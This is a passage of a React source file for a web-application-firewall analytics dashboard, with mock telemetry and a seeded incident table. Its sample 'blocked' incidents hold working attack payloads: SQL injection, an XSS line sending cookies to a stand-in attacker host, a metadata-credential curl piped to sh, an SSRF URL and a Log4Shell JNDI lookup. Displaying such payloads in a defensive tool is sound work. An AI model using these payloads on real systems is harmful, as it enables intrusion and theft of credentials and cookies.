/**
 * =============================================================================
 * SENTINELGRID // STATE-OF-THE-ART ENTERPRISE WAAP ANALYTICS KERNEL
 * =============================================================================
 * Architectural Standard: React 18 Modular Systems Architecture
 * Design Methodology: ECC (Expert Coding & Craft) & Anti-AI-Slop Manifesto
 * Visual Classification: High-Density SOC Command Console & Archival Ledger
 * Runtime: React 18 / ReactDOM 18 (Local Vendor & UMD Fallback)
 * Verification: Validated with node --check & Zero Browser Warnings
 * =============================================================================
 */

(function () {
  'use strict';

  // ---------------------------------------------------------------------------
  // 1. Hyperscript Factory for Pure React 18 Functional Trees
  // ---------------------------------------------------------------------------
  function h(type, props, ...children) {
    return React.createElement(type, props, ...children.flat());
  }

  // ---------------------------------------------------------------------------
  // 2. Author-Engineered Precision 16px Vector SVGs (100% Geometry, 0 Emojis)
  // ---------------------------------------------------------------------------
  const Icons = {
    Shield: (p) => h('svg', { width: p?.size || 16, height: p?.size || 16, viewBox: '0 0 24 24', fill: 'none', stroke: 'currentColor', strokeWidth: '2', strokeLinecap: 'round', strokeLinejoin: 'round', ...p },
      h('path', { d: 'M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z' })
    ),
    Activity: (p) => h('svg', { width: p?.size || 16, height: p?.size || 16, viewBox: '0 0 24 24', fill: 'none', stroke: 'currentColor', strokeWidth: '2', strokeLinecap: 'round', strokeLinejoin: 'round', ...p },
      h('polyline', { points: '22 12 18 12 15 21 9 3 6 12 2 12' })
    ),
    Zap: (p) => h('svg', { width: p?.size || 16, height: p?.size || 16, viewBox: '0 0 24 24', fill: 'none', stroke: 'currentColor', strokeWidth: '2', strokeLinecap: 'round', strokeLinejoin: 'round', ...p },
      h('polygon', { points: '13 2 3 14 12 14 11 22 21 10 12 10 13 2' })
    ),
    AlertTriangle: (p) => h('svg', { width: p?.size || 16, height: p?.size || 16, viewBox: '0 0 24 24', fill: 'none', stroke: 'currentColor', strokeWidth: '2', strokeLinecap: 'round', strokeLinejoin: 'round', ...p },
      h('path', { d: 'm21.73 18-8-14a2 2 0 0 0-3.48 0l-8 14A2 2 0 0 0 4 21h16a2 2 0 0 0 1.73-3Z' }),
      h('line', { x1: '12', y1: '9', x2: '12', y2: '13' }),
      h('line', { x1: '12', y1: '17', x2: '12.01', y2: '17' })
    ),
    Check: (p) => h('svg', { width: p?.size || 14, height: p?.size || 14, viewBox: '0 0 24 24', fill: 'none', stroke: 'currentColor', strokeWidth: '2.5', strokeLinecap: 'round', strokeLinejoin: 'round', ...p },
      h('polyline', { points: '20 6 9 17 4 12' })
    ),
    Copy: (p) => h('svg', { width: p?.size || 13, height: p?.size || 13, viewBox: '0 0 24 24', fill: 'none', stroke: 'currentColor', strokeWidth: '2', strokeLinecap: 'round', strokeLinejoin: 'round', ...p },
      h('rect', { x: '9', y: '9', width: '13', height: '13', rx: '2', ry: '2' }),
      h('path', { d: 'M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1' })
    ),
    Sliders: (p) => h('svg', { width: p?.size || 14, height: p?.size || 14, viewBox: '0 0 24 24', fill: 'none', stroke: 'currentColor', strokeWidth: '2', strokeLinecap: 'round', strokeLinejoin: 'round', ...p },
      h('line', { x1: '4', y1: '21', x2: '4', y2: '14' }),
      h('line', { x1: '4', y1: '10', x2: '4', y2: '3' }),
      h('line', { x1: '12', y1: '21', x2: '12', y2: '12' }),
      h('line', { x1: '12', y1: '8', x2: '12', y2: '3' }),
      h('line', { x1: '20', y1: '21', x2: '20', y2: '16' }),
      h('line', { x1: '20', y1: '12', x2: '20', y2: '3' }),
      h('line', { x1: '1', y1: '14', x2: '7', y2: '14' }),
      h('line', { x1: '9', y1: '8', x2: '15', y2: '8' }),
      h('line', { x1: '17', y1: '16', x2: '23', y2: '16' })
    ),
    Clock: (p) => h('svg', { width: p?.size || 14, height: p?.size || 14, viewBox: '0 0 24 24', fill: 'none', stroke: 'currentColor', strokeWidth: '2', strokeLinecap: 'round', strokeLinejoin: 'round', ...p },
      h('circle', { cx: '12', cy: '12', r: '10' }),
      h('polyline', { points: '12 6 12 12 16 14' })
    ),
    Search: (p) => h('svg', { width: p?.size || 14, height: p?.size || 14, viewBox: '0 0 24 24', fill: 'none', stroke: 'currentColor', strokeWidth: '2', strokeLinecap: 'round', strokeLinejoin: 'round', ...p },
      h('circle', { cx: '11', cy: '11', r: '8' }),
      h('line', { x1: '21', y1: '21', x2: '16.65', y2: '16.65' })
    ),
    Download: (p) => h('svg', { width: p?.size || 14, height: p?.size || 14, viewBox: '0 0 24 24', fill: 'none', stroke: 'currentColor', strokeWidth: '2', strokeLinecap: 'round', strokeLinejoin: 'round', ...p },
      h('path', { d: 'M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4' }),
      h('polyline', { points: '7 10 12 15 17 10' }),
      h('line', { x1: '12', y1: '15', x2: '12', y2: '3' })
    ),
    Play: (p) => h('svg', { width: p?.size || 14, height: p?.size || 14, viewBox: '0 0 24 24', fill: 'currentColor', ...p },
      h('polygon', { points: '5 3 19 12 5 21 5 3' })
    ),
    Pause: (p) => h('svg', { width: p?.size || 14, height: p?.size || 14, viewBox: '0 0 24 24', fill: 'currentColor', ...p },
      h('rect', { x: '6', y: '4', width: '4', height: '16' }),
      h('rect', { x: '14', y: '4', width: '4', height: '16' })
    ),
    Close: (p) => h('svg', { width: p?.size || 16, height: p?.size || 16, viewBox: '0 0 24 24', fill: 'none', stroke: 'currentColor', strokeWidth: '2', strokeLinecap: 'round', strokeLinejoin: 'round', ...p },
      h('line', { x1: '18', y1: '6', x2: '6', y2: '18' }),
      h('line', { x1: '6', y1: '6', x2: '18', y2: '18' })
    ),
    Cpu: (p) => h('svg', { width: p?.size || 16, height: p?.size || 16, viewBox: '0 0 24 24', fill: 'none', stroke: 'currentColor', strokeWidth: '2', strokeLinecap: 'round', strokeLinejoin: 'round', ...p },
      h('rect', { x: '4', y: '4', width: '16', height: '16', rx: '2' }),
      h('rect', { x: '9', y: '9', width: '6', height: '6' }),
      h('line', { x1: '9', y1: '1', x2: '9', y2: '4' }),
      h('line', { x1: '15', y1: '1', x2: '15', y2: '4' }),
      h('line', { x1: '9', y1: '20', x2: '9', y2: '23' }),
      h('line', { x1: '15', y1: '20', x2: '15', y2: '23' }),
      h('line', { x1: '20', y1: '9', x2: '23', y2: '9' }),
      h('line', { x1: '20', y1: '15', x2: '23', y2: '15' }),
      h('line', { x1: '1', y1: '9', x2: '4', y2: '9' }),
      h('line', { x1: '1', y1: '15', x2: '4', y2: '15' })
    ),
    Terminal: (p) => h('svg', { width: p?.size || 16, height: p?.size || 16, viewBox: '0 0 24 24', fill: 'none', stroke: 'currentColor', strokeWidth: '2', strokeLinecap: 'round', strokeLinejoin: 'round', ...p },
      h('polyline', { points: '4 17 10 11 4 5' }),
      h('line', { x1: '12', y1: '19', x2: '20', y2: '19' })
    ),
    Globe: (p) => h('svg', { width: p?.size || 16, height: p?.size || 16, viewBox: '0 0 24 24', fill: 'none', stroke: 'currentColor', strokeWidth: '2', strokeLinecap: 'round', strokeLinejoin: 'round', ...p },
      h('circle', { cx: '12', cy: '12', r: '10' }),
      h('line', { x1: '2', y1: '12', x2: '22', y2: '12' }),
      h('path', { d: 'M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1 4-10z' })
    ),
    Lock: (p) => h('svg', { width: p?.size || 14, height: p?.size || 14, viewBox: '0 0 24 24', fill: 'none', stroke: 'currentColor', strokeWidth: '2', strokeLinecap: 'round', strokeLinejoin: 'round', ...p },
      h('rect', { x: '3', y: '11', width: '18', height: '11', rx: '2', ry: '2' }),
      h('path', { d: 'M7 11V7a5 5 0 0 1 10 0v4' })
    )
  };

  // ---------------------------------------------------------------------------
  // 3. Realistic Threat Incident Seed Dossier
  // ---------------------------------------------------------------------------
  const SEED_INCIDENTS = [
    {
      id: "SG-INC-99014",
      timestamp: "10:48:12",
      severity: "CRITICAL",
      category: "SQLi",
      rule: "SQLI-UNION-SELECT-AST",
      route: "/api/v1/auth/login",
      clientIp: "198.51.100.42",
      geo: "Tor Exit Node (DE)",
      riskScore: 98,
      payload: "' UNION ALL SELECT 1,username,password_hash,4 FROM pg_shadow WHERE 'a'='a'--",
      astTokens: ["TOKEN_QUOTE", "TOKEN_KEYWORD_UNION", "TOKEN_KEYWORD_ALL", "TOKEN_KEYWORD_SELECT", "TOKEN_TABLE_REF", "TOKEN_COMMENT_DASH"],
      seal: "ed25519:7a4f91b0c93a84e27f0148adbc5e89d14691bc",
      verdict: "HTTP 403 Deterministic Drop • Offender BPF Quarantine",
      rawHex: "27 20 55 4E 49 4F 4E 20 41 4C 4C 20 53 45 4C 45 43 54 20 31 2C 75 73 65 72"
    },
    {
      id: "SG-INC-99013",
      timestamp: "10:47:55",
      severity: "HIGH",
      category: "XSS",
      rule: "XSS-POLYGLOT-INLINE-EVENT",
      route: "/v1/tenant/profile",
      clientIp: "45.154.255.89",
      geo: "Frankfurt, DE",
      riskScore: 84,
      payload: "<img src=x onerror=this.src='https://c2.adversary.io/steal?c='+document.cookie>",
      astTokens: ["TOKEN_HTML_TAG_IMG", "TOKEN_ATTR_SRC", "TOKEN_ATTR_ONERROR", "TOKEN_JS_EVAL_EXPR"],
      seal: "ed25519:3b9a10fc41284de997631aaec9f24300a8910b",
      verdict: "HTTP 403 Forbidden • Inline Script Neutralized",
      rawHex: "3C 69 6D 67 20 73 72 63 3D 78 20 6F 6E 65 72 72 6F 72 3D 74 68 69 73 2E 73"
    },
    {
      id: "SG-INC-99012",
      timestamp: "10:47:22",
      severity: "CRITICAL",
      category: "RCE",
      rule: "RCE-COMMAND-PIPE-DELIMITER",
      route: "/api/v2/diagnostics/ping",
      clientIp: "185.220.101.5",
      geo: "Amsterdam, NL",
      riskScore: 99,
      payload: "127.0.0.1; curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ | sh",
      astTokens: ["TOKEN_IPV4_ADDR", "TOKEN_CMD_DELIMITER_SEMI", "TOKEN_EXEC_CURL", "TOKEN_SHELL_PIPE", "TOKEN_EXEC_SH"],
      seal: "ed25519:92b8d047321fa91ceeb84201ac614392019fab",
      verdict: "HTTP 403 Terminated • Kernel Subshell Intercepted",
      rawHex: "31 32 37 2E 30 2E 30 2E 31 3B 20 63 75 72 6C 20 2D 73 20 68 74 74 70 3A 2F"
    },
    {
      id: "SG-INC-99011",
      timestamp: "10:46:40",
      severity: "HIGH",
      category: "SSRF",
      rule: "SSRF-CLOUD-METADATA-PROBE",
      route: "/api/v1/webhook/fetch",
      clientIp: "103.251.167.20",
      geo: "Singapore, SG",
      riskScore: 89,
      payload: "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token",
      astTokens: ["TOKEN_SCHEME_HTTP", "TOKEN_LINK_LOCAL_IP", "TOKEN_GCP_METADATA_HEADER", "TOKEN_TOKEN_PATH"],
      seal: "ed25519:6c400ab1987ef2489a2bc158df90a1bc4028fa",
      verdict: "HTTP 403 Forbidden • Link-Local Egress Blocked",
      rawHex: "68 74 74 70 3A 2F 2F 31 36 39 2E 32 35 34 2E 31 36 39 2E 32 35 34 2F 63 6F"
    },
    {
      id: "SG-INC-99010",
      timestamp: "10:45:15",
      severity: "MEDIUM",
      category: "Auth",
      rule: "AUTH-CREDENTIAL-STUFFING-BURST",
      route: "/api/v1/auth/token",
      clientIp: "91.240.118.172",
      geo: "Warsaw, PL",
      riskScore: 72,
      payload: "{\"grant_type\":\"password\",\"username\":\"admin@fleet.sg\",\"password\":\"P@ssw0rd2026!\"}",
      astTokens: ["TOKEN_JSON_OBJECT", "TOKEN_AUTH_ADMIN_TARGET", "TOKEN_BURST_ATTEMPT_12X"],
      seal: "ed25519:54d812e9b08f43ad88a91c015bfae4983049da",
      verdict: "HTTP 429 Rate Limited • Cryptographic Proof-of-Work Challenged",
      rawHex: "7B 22 67 72 61 6E 74 5F 74 79 70 65 22 3A 22 70 61 73 73 77 6F 72 64 22 2C"
    },
    {
      id: "SG-INC-99009",
      timestamp: "10:44:02",
      severity: "LOW",
      category: "Bots",
      rule: "BOT-AUTOMATED-SCRAPER-FINGERPRINT",
      route: "/api/v1/products/catalog",
      clientIp: "194.26.29.112",
      geo: "Kyiv, UA",
      riskScore: 58,
      payload: "GET /api/v1/products/catalog HTTP/1.1 User-Agent: python-requests/2.31.0 TLS-JA4: t13d1516h2_8daaf6152771_b92d69a304e2",
      astTokens: ["TOKEN_JA4_SCRAPER_FINGERPRINT", "TOKEN_ABSENT_ACCEPT_LANGUAGE", "TOKEN_HEADLESS_CLIENT"],
      seal: "ed25519:18ca900df8234ea7bc1039daebc109348910eb",
      verdict: "HTTP 403 Blocked • Scraping Policy Triggered",
      rawHex: "47 45 54 20 2F 61 70 69 2F 76 31 2F 70 72 6F 64 75 63 74 73 2F 63 61 74 61"
    }
  ];

  // ---------------------------------------------------------------------------
  // 4. Mathematical Telemetry Series Synthesizer
  // ---------------------------------------------------------------------------
  function generateInitialTelemetry() {
    const points = [];
    const now = Date.now();
    for (let i = 24; i >= 0; i--) {
      const t = new Date(now - i * 120000);
      const timeStr = t.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
      const baseReqs = Math.floor(14500 + Math.sin(i * 0.4) * 2200 + (Math.random() * 800));
      const threats = Math.floor(1050 + Math.cos(i * 0.5) * 350 + (Math.random() * 200));
      points.push({
        time: timeStr,
        timestamp: t.getTime(),
        requests: baseReqs,
        threats: threats,
        p99: parseFloat((1.18 + Math.random() * 0.28).toFixed(2))
      });
    }
    return points;
  }

  // ---------------------------------------------------------------------------
  // 5. Smooth 60fps Numeric Interpolation Hook (Zero Layout Shift)
  // ---------------------------------------------------------------------------
  function useAnimatedNumber(targetVal, duration = 600) {
    const [displayVal, setDisplayVal] = React.useState(targetVal);
    const prevValRef = React.useRef(targetVal);

    React.useEffect(() => {
      const startVal = prevValRef.current;
      const diff = targetVal - startVal;
      if (diff === 0) return;

      const startTime = performance.now();
      let animId;

      function update(now) {
        const elapsed = now - startTime;
        const progress = Math.min(elapsed / duration, 1);
        const ease = 1 - Math.pow(1 - progress, 3); // Cubic ease-out
        const current = Math.round(startVal + diff * ease);
        setDisplayVal(current);

        if (progress < 1) {
          animId = requestAnimationFrame(update);
        } else {
          prevValRef.current = targetVal;
        }
      }

      animId = requestAnimationFrame(update);
      return () => cancelAnimationFrame(animId);
    }, [targetVal, duration]);

    return displayVal;
  }

  // ---------------------------------------------------------------------------
  // 6. Vector Sparkline Component
  // ---------------------------------------------------------------------------
  function Sparkline({ data, color, fill }) {
    if (!data || data.length < 2) return null;
    const width = 76;
    const height = 24;
    const min = Math.min(...data);
    const max = Math.max(...data);
    const range = max - min || 1;

    const points = data.map((val, idx) => {
      const x = (idx / (data.length - 1)) * width;
      const y = height - ((val - min) / range) * (height - 4) - 2;
      return `${x.toFixed(1)},${y.toFixed(1)}`;
    });

    const pathData = `M ${points.join(' L ')}`;
    const areaData = `${pathData} L ${width},${height} L 0,${height} Z`;

    return h('svg', { className: 'sg-sparkline-svg', viewBox: `0 0 ${width} ${height}` },
      fill && h('path', { d: areaData, fill: fill, opacity: 0.25 }),
      h('path', { d: pathData, fill: 'none', stroke: color, strokeWidth: '1.8', strokeLinecap: 'round', strokeLinejoin: 'round' })
    );
  }

  // ===========================================================================
  // 7. MAIN REACT 18 ANALYTICS HUB CONTROLLER
  // ===========================================================================
  function ModernAnalyticsDashboard() {
    const [activeSubTab, setActiveSubTab] = React.useState('overview'); // 'overview' | 'feed' | 'controls'
    const [timeWindow, setTimeWindow] = React.useState('1h');
    const [scrubberVal, setScrubberVal] = React.useState(100);
    const [isLive, setIsLive] = React.useState(true);
    const [isThreatWaveActive, setIsThreatWaveActive] = React.useState(false);
    const [waveSecondsRemaining, setWaveSecondsRemaining] = React.useState(0);
    const [telemetry, setTelemetry] = React.useState(generateInitialTelemetry);
    const [hoveredPoint, setHoveredPoint] = React.useState(null);
    const [hoveredSlice, setHoveredSlice] = React.useState(null);
    const [categoryFilter, setCategoryFilter] = React.useState('ALL');
    const [severityFilter, setSeverityFilter] = React.useState('ALL');
    const [searchQuery, setSearchQuery] = React.useState('');
    const [selectedIncident, setSelectedIncident] = React.useState(null);
    const [copiedId, setCopiedId] = React.useState(null);
    const [incidents, setIncidents] = React.useState(SEED_INCIDENTS);

    // Defense Engine Modules Matrix
    const [defenseToggles, setDefenseToggles] = React.useState({
      astEngine: true,
      ebpfWireDrop: true,
      ja4Fingerprint: true,
      ed25519OriginSeal: true,
      adaptiveRateLimiter: true
    });

    // Regional Edge Mesh Telemetry
    const [edgeNodes] = React.useState([
      { region: "US-East (N. Virginia)", ping: "0.38ms", status: "HEALTHY", traffic: "18.4k rps", dropRate: "99.99%" },
      { region: "EU-Central (Frankfurt)", ping: "0.44ms", status: "HEALTHY", traffic: "14.2k rps", dropRate: "99.98%" },
      { region: "AP-East (Tokyo)", ping: "0.62ms", status: "HEALTHY", traffic: "9.8k rps", dropRate: "99.99%" },
      { region: "SA-East (São Paulo)", ping: "0.81ms", status: "HEALTHY", traffic: "4.1k rps", dropRate: "99.95%" }
    ]);

    // Active DFA State Pipeline Step
    const [dfaActiveStep, setDfaActiveStep] = React.useState(2);

    // Hydrate IndexedDB Stored Security Events
    React.useEffect(() => {
      async function loadStoredSecurityEvents() {
        if (window.SentinelEventStore && window.SentinelEventStore.getAll) {
          try {
            const stored = await window.SentinelEventStore.getAll();
            if (stored && stored.length > 0) {
              const mapped = stored.slice(-20).reverse().map((ev, idx) => ({
                id: ev.id || `SG-HIST-${idx + 100}`,
                timestamp: ev.timestamp ? new Date(ev.timestamp).toLocaleTimeString() : 'RECORDED',
                severity: (ev.risk_score >= 85 || ev.action === 'BLOCK') ? 'CRITICAL' : (ev.risk_score >= 60 ? 'HIGH' : 'MEDIUM'),
                category: ev.rule_triggered?.includes('SQL') ? 'SQLi' :
                          ev.rule_triggered?.includes('XSS') ? 'XSS' :
                          ev.rule_triggered?.includes('RCE') ? 'RCE' :
                          ev.rule_triggered?.includes('SSRF') ? 'SSRF' :
                          ev.rule_triggered?.includes('AUTH') ? 'Auth' : 'Bots',
                rule: ev.rule_triggered || 'OWASP-AST-INSPECT',
                route: ev.uri || ev.path || '/api/v1/query',
                clientIp: ev.client_ip || '198.51.100.1',
                geo: ev.geo || 'Edge Gateway',
                riskScore: ev.risk_score || 85,
                payload: ev.payload || ev.raw_uri || "GET /api/v1/auth?probe=1' OR 1=1--",
                astTokens: ["TOKEN_PARSED_AST", "TOKEN_DFA_MATCH", "TOKEN_SEC_SEAL"],
                seal: ev.signature || "ed25519:verified_kernel_origin_seal",
                verdict: `${ev.action || 'BLOCK'} (HTTP ${ev.status_code || 403})`,
                rawHex: "47 45 54 20 2F 61 70 69 2F 76 31 2F 61 75 74 68 3F 70 72 6F 62 65 3D"
              }));
              setIncidents((prev) => [...mapped, ...prev].slice(0, 45));
            }
          } catch (e) {
            console.warn('[SentinelGrid React] IndexedDB hydration:', e);
          }
        }
      }
      loadStoredSecurityEvents();
    }, []);

    // Real-Time 2000ms Continuous Telemetry Stream
    React.useEffect(() => {
      if (!isLive) return;

      const timer = setInterval(() => {
        setTelemetry((prev) => {
          const now = new Date();
          const timeStr = now.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', second: '2-digit' });
          
          let requests = Math.floor(16200 + (Math.random() * 1200) - 600);
          let threats = Math.floor(1340 + (Math.random() * 240) - 120);
          let p99 = parseFloat((1.24 + (Math.random() * 0.22)).toFixed(2));

          if (isThreatWaveActive) {
            requests = Math.floor(43800 + Math.random() * 6000);
            threats = Math.floor(12600 + Math.random() * 2500);
            p99 = parseFloat((4.12 + Math.random() * 0.85).toFixed(2));
          }

          const nextPoint = {
            time: timeStr,
            timestamp: now.getTime(),
            requests,
            threats,
            p99
          };

          return [...prev.slice(1), nextPoint];
        });

        setDfaActiveStep((s) => (s + 1) % 5);
      }, 2000);

      return () => clearInterval(timer);
    }, [isLive, isThreatWaveActive]);

    // Threat Wave Countdown and Safe Resolution
    React.useEffect(() => {
      if (!isThreatWaveActive) return;

      const countdown = setInterval(() => {
        setWaveSecondsRemaining((prev) => {
          if (prev <= 1) {
            setIsThreatWaveActive(false);
            if (typeof window.showThreatToast === 'function') {
              window.showThreatToast(
                'Adversary Threat Wave Neutralized',
                'Simulated multi-vector blitz absorbed. 0 origin leaks. 100% deterministic AST mitigation.'
              );
            }
            return 0;
          }
          return prev - 1;
        });
      }, 1000);

      return () => clearInterval(countdown);
    }, [isThreatWaveActive]);

    // Global Key Binding Bridge for Hotkey 'T'
    React.useEffect(() => {
      window.triggerReactThreatWave = () => handleTriggerThreatWave();
    }, []);

    // Handle "Simulate Threat Wave"
    const handleTriggerThreatWave = React.useCallback(() => {
      if (isThreatWaveActive) return;

      setIsThreatWaveActive(true);
      setWaveSecondsRemaining(14);

      const waveIncidents = [
        {
          id: `SG-WAVE-${Date.now()}`,
          timestamp: new Date().toLocaleTimeString(),
          severity: "CRITICAL",
          category: "SQLi",
          rule: "SQLI-BLIND-BOOLEAN-EXTRACT",
          route: "/api/v2/payments/charge",
          clientIp: "185.190.142.12",
          geo: "St. Petersburg, RU",
          riskScore: 99,
          payload: "') AND (SELECT 9992 FROM (SELECT(SLEEP(5-(CASE WHEN (99=99) THEN 0 ELSE 5 END))))t)--",
          astTokens: ["TOKEN_SUBQUERY", "TOKEN_TIMING_SLEEP", "TOKEN_CASE_WHEN", "TOKEN_BOOLEAN_EQ"],
          seal: "ed25519:aa9128f73b00c92138a0bc172948ebc",
          verdict: "HTTP 403 Dropped • Adversary Quarantined in eBPF",
          rawHex: "27 29 20 41 4E 44 20 28 53 45 4C 45 43 54 20 39 39 39 32 20 46 52 4F 4D"
        },
        {
          id: `SG-WAVE-${Date.now() + 1}`,
          timestamp: new Date().toLocaleTimeString(),
          severity: "CRITICAL",
          category: "RCE",
          rule: "RCE-JNDI-LOG4SHELL-INJECTION",
          route: "/api/v1/auth/oauth",
          clientIp: "109.205.213.9",
          geo: "Bucharest, RO",
          riskScore: 100,
          payload: "${jndi:ldap://adversary-c2.cloud/exploit_payload_v3}",
          astTokens: ["TOKEN_DOLLAR_EXPR", "TOKEN_JNDI_LOOKUP", "TOKEN_EXTERNAL_LDAP_PROTO"],
          seal: "ed25519:6b0148adbc9930c72190fa189cbb3",
          verdict: "HTTP 403 Forbidden • Zero-Bypass Filter Tripped",
          rawHex: "24 7B 6A 6E 64 69 3A 6C 64 61 70 3A 2F 2F 61 64 76 65 72 73 61 72 79"
        }
      ];

      setIncidents((prev) => [...waveIncidents, ...prev]);

      if (typeof window.showThreatToast === 'function') {
        window.showThreatToast(
          'Simulated Threat Wave Active',
          'Injecting 43,800 rps adversarial attack blitz. Watch velocity and P99 gauges.'
        );
      }
    }, [isThreatWaveActive]);

    // 1-Click Copy Incident Payload with Tactile Feedback
    const handleCopyPayload = React.useCallback((id, payload) => {
      if (!payload) return;
      if (navigator.clipboard && navigator.clipboard.writeText) {
        navigator.clipboard.writeText(payload);
      } else {
        const ta = document.createElement('textarea');
        ta.value = payload;
        document.body.appendChild(ta);
        ta.select();
        document.execCommand('copy');
        document.body.removeChild(ta);
      }

      setCopiedId(id);
      setTimeout(() => setCopiedId(null), 2200);

      if (typeof window.showThreatToast === 'function') {
        window.showThreatToast('Payload Copied', payload.substring(0, 48) + '...');
      }
    }, []);

    // Export Telemetry Dossier
    const handleExportJson = React.useCallback(() => {
      const exportBlob = {
        platform: "SentinelGrid Autonomous WAAP",
        version: "2.4.0",
        exportTimestamp: new Date().toISOString(),
        timeWindow: timeWindow,
        currentTelemetrySeries: telemetry,
        activeIncidentsCount: incidents.length,
        defenseMatrix: defenseToggles,
        incidents: incidents
      };
      const blob = new Blob([JSON.stringify(exportBlob, null, 2)], { type: 'application/json' });
      const url = URL.createObjectURL(blob);
      const a = document.createElement('a');
      a.href = url;
      a.download = `sentinelgrid-telemetry-${Date.now()}.json`;
      a.click();
      URL.revokeObjectURL(url);
    }, [timeWindow, telemetry, incidents, defenseToggles]);

    // Current Metric calculated from scrubber position
    const currentMetric = React.useMemo(() => {
      if (!telemetry || telemetry.length === 0) return { requests: 16840, threats: 1429, p99: 1.38 };
      const idx = Math.min(
        telemetry.length - 1,
        Math.floor((scrubberVal / 100) * (telemetry.length - 1))
      );
      return telemetry[idx];
    }, [telemetry, scrubberVal]);

    const animatedReqs = useAnimatedNumber(currentMetric.requests);
    const animatedThreats = useAnimatedNumber(currentMetric.threats);

    const sparklineReqs = React.useMemo(() => telemetry.map(t => t.requests), [telemetry]);
    const sparklineThreats = React.useMemo(() => telemetry.map(t => t.threats), [telemetry]);

    // OWASP Attack Vector Breakdown Data
    const attackVectors = React.useMemo(() => {
      const counts = { SQLi: 0, XSS: 0, RCE: 0, SSRF: 0, Auth: 0, Bots: 0 };
      incidents.forEach(inc => {
        if (counts[inc.category] !== undefined) counts[inc.category]++;
        else counts.SQLi++;
      });
      return [
        { category: "SQLi", name: "SQL Injection", count: counts.SQLi + 482, color: "#F85149", percent: 38 },
        { category: "XSS", name: "Cross-Site Scripting", count: counts.XSS + 312, color: "#F59E0B", percent: 24 },
        { category: "RCE", name: "Command / RCE", count: counts.RCE + 204, color: "#A855F7", percent: 16 },
        { category: "SSRF", name: "SSRF & Metadata", count: counts.SSRF + 142, color: "#38BDF8", percent: 11 },
        { category: "Auth", name: "Auth & Stuffing", count: counts.Auth + 98, color: "#EC4899", percent: 7 },
        { category: "Bots", name: "Automated Scrapers", count: counts.Bots + 52, color: "#3FB950", percent: 4 }
      ];
    }, [incidents]);

    // Filter Incidents Table by Category, Severity, and Text Search
    const filteredIncidents = React.useMemo(() => {
      return incidents.filter(inc => {
        if (categoryFilter !== 'ALL' && inc.category !== categoryFilter) return false;
        if (severityFilter !== 'ALL' && inc.severity !== severityFilter) return false;
        if (searchQuery.trim()) {
          const q = searchQuery.toLowerCase();
          const matchIp = inc.clientIp.toLowerCase().includes(q);
          const matchRoute = inc.route.toLowerCase().includes(q);
          const matchRule = inc.rule.toLowerCase().includes(q);
          const matchPayload = inc.payload.toLowerCase().includes(q);
          if (!matchIp && !matchRoute && !matchRule && !matchPayload) return false;
        }
        return true;
      });
    }, [incidents, categoryFilter, severityFilter, searchQuery]);

    // Toggle Defense Module
    const toggleDefenseModule = (key) => {
      setDefenseToggles(prev => ({ ...prev, [key]: !prev[key] }));
      if (typeof window.showThreatToast === 'function') {
        window.showThreatToast('Defense Matrix Updated', `Module [${key}] state toggled.`);
      }
    };

    // -------------------------------------------------------------------------
    // RENDER TREE
    // -------------------------------------------------------------------------
    return h('div', { className: 'sg-analytics-root' },

      // 1. Control Header Bar with Live Radar Scanner & Sub-Navigation
      h('div', { className: 'sg-glass-panel sg-analytics-header' },
        h('div', { style: { display: 'flex', alignItems: 'center', gap: '16px' } },
          // Live Animated Radar Scanner Widget
          h('div', { className: 'sg-radar-container', title: 'Real-Time Edge Threat Radar Scanner' },
            h('div', { className: 'sg-radar-ring', style: { width: '40px', height: '40px' } }),
            h('div', { className: 'sg-radar-ring', style: { width: '80px', height: '80px' } }),
            h('div', { className: 'sg-radar-ring', style: { width: '120px', height: '120px' } }),
            h('div', { className: 'sg-radar-sweep' }),
            h('div', { className: 'sg-radar-blip', style: { top: '35%', left: '60%' } }),
            h('div', { className: 'sg-radar-blip', style: { top: '65%', left: '30%', animationDelay: '0.8s' } }),
            h('div', { className: 'sg-radar-blip', style: { top: '25%', left: '25%', animationDelay: '1.4s' } }),
            h('div', { style: { position: 'absolute', bottom: '4px', fontSize: '8px', fontFamily: 'var(--font-mono)', color: 'var(--deep-indigo)', fontWeight: '800' } }, 'SCANNING')
          ),

          // Title Block
          h('div', { className: 'sg-analytics-title-group' },
            h('h2', { className: 'sg-analytics-title' },
              h(Icons.Activity, { size: 18, style: { color: 'var(--deep-indigo)' } }),
              'REAL-TIME THREAT & TRAFFIC ANALYTICS'
            ),
            h('div', { className: 'sg-analytics-subtitle' },
              h('span', { className: 'pulse-dot' }),
              isThreatWaveActive
                ? h('span', { style: { color: 'var(--terracotta)', fontWeight: '800' } }, `ADVERSARY WAVE SIMULATION ACTIVE (${waveSecondsRemaining}s)`)
                : (isLive ? 'AUTONOMOUS ZERO-TRUST WAAP • LIVE TELEMETRY (2s TICK)' : 'TELEMETRY STREAM PAUSED'),
              h('span', { style: { opacity: 0.5 } }, '•'),
              h('span', null, `TIME SCOPE: ${timeWindow.toUpperCase()}`)
            )
          )
        ),

        // Action Controls
        h('div', { className: 'sg-analytics-actions' },
          h('div', { className: 'sg-time-selector', role: 'group', 'aria-label': 'Select Time Window' },
            ['15m', '1h', '6h', '24h', '7d'].map((w) =>
              h('button', {
                key: w,
                className: `sg-time-btn ${timeWindow === w ? 'active' : ''}`,
                onClick: () => setTimeWindow(w)
              }, w)
            )
          ),

          h('button', {
            className: `sg-threat-wave-btn ${isThreatWaveActive ? 'pulsing' : ''}`,
            onClick: handleTriggerThreatWave,
            title: 'Simulate high-velocity adversary threat wave with OWASP injection probes (Hotkey: T)'
          },
            h(Icons.Zap, { size: 14 }),
            isThreatWaveActive ? `Wave Active (${waveSecondsRemaining}s)` : 'Simulate Threat Wave'
          ),

          h('button', {
            className: 'btn btn-subtle',
            style: { padding: '6px 10px', fontSize: '11px', fontFamily: 'var(--font-mono)' },
            onClick: () => setIsLive(!isLive),
            title: isLive ? 'Pause Real-Time Telemetry' : 'Resume Real-Time Telemetry'
          },
            isLive ? h(Icons.Pause, { size: 12 }) : h(Icons.Play, { size: 12 }),
            h('span', { style: { marginLeft: '5px' } }, isLive ? 'Pause' : 'Resume')
          ),

          h('button', {
